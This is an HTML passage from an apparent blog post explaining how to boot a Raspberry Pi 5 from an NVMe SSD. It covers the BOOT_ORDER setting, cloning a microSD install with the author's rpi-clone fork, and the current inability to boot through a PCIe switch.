<p>Read <a href="https://www.raspberrypi.com/documentation/computers/raspberry-pi.html#BOOT_ORDER">Raspberry Pi's documentation on BOOT_ORDER</a> for all the details. For now, the pertinent bit is the <code>6</code> at the end: that is what tells the Pi to attempt NVMe boot first!</p>

<p>Reboot your Raspberry Pi 5 to make the change take effect.</p>

<p>NVMe boot won't work unless you have the external PCI Express port enabled, <em>and</em> there's a working NVMe drive with a valid boot partition! If you don't have that (e.g. you used Raspberry Pi Imager with an external USB NVMe adapter to flash Pi OS to an NVMe drive from another computer), then follow the steps in the next section to clone your existing Pi OS install to an NVMe SSD.</p>

<h2>Clone your microSD boot volume to an NVMe SSD</h2>

<p>Assuming you already have Raspberry Pi OS on a microSD card that is booting your Raspberry Pi 5 internally, and the NVMe SSD is connected and visible (check if you see a device <code>/dev/nvme0n1</code> after running <code>lsblk</code>), you can use <a href="https://github.com/billw2/rpi-clone"><code>rpi-clone</code></a> to clone the internal microSD boot volumes to your NVMe SSD:</p>

<pre><code># Install rpi-clone.
git clone -b 123-nvme https://github.com/geerlingguy/rpi-clone.git
cd rpi-clone
sudo cp rpi-clone rpi-clone-setup /usr/local/sbin

# Clone to the NVMe drive (usually nvme0n1, but check with `lsblk`).
sudo rpi-clone nvme0n1
</code></pre>

<blockquote>
  <p>Note: I'm using my fork of <code>rpi-clone</code>, because the official version has not merged <a href="https://github.com/billw2/rpi-clone/pull/147">NVMe support</a> yet.</p>
</blockquote>

<h2>NVMe behind a PCIe bridge / switch</h2>

<p>Currently the Raspberry Pi 5 only exposes one PCIe lane externally—though there are four more lanes taken up by the RP1 chip. Typical PC motherboards have a number of lanes to play with, so you often find two, three, or even <em>four</em> M.2 NVMe slots on high-end motherboards.</p>

<p>Even there, some motherboards have PCI Express switches (or 'bridges') which allow multiple PCIe devices to share the same lane or lanes, in a similar way an Ethernet switch can allow multiple computers to share a single network connection.</p>

<p>On the Compute Module 4, <a href="https://github.com/raspberrypi/firmware/issues/1684">bootloader space constraints prevented NVMe boot if you used a switch</a>, but I wonder if that restriction is lifted on the Raspberry Pi 5—and if so, is it already implemented?</p>

<p>As of now, no. I can <em>see</em> and <em>use</em> an NVMe SSD through a PCIe switch, but I am not able to <em>boot</em> the Raspberry Pi 5 from it, unless it is directly connected (as the lone PCIe device on the bus).</p>

<p>I've opened an issue to ask about this feature in the Raspberry Pi firmware repo: <a href="https://github.com/raspberrypi/firmware/issues/1833">Can't boot Pi 5 via NVMe behind PCIe switch / bridge</a>.</p></div></div>]]></description>
